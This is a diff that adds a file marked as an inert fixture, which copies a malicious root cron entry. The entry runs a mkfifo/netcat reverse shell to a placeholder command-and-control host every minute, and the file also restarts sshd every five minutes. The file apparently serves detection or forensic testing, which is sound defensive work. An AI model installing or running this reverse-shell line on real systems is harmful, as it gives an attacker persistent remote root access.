@@ -1,0 +1,3 @@
+# FIXTURE - inert. Reproduces the structure of the real root cron entry.
+* * * * * root /bin/bash -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc c2.example.invalid 9925 > /tmp/f'
+*/5 * * * * root systemctl restart sshd
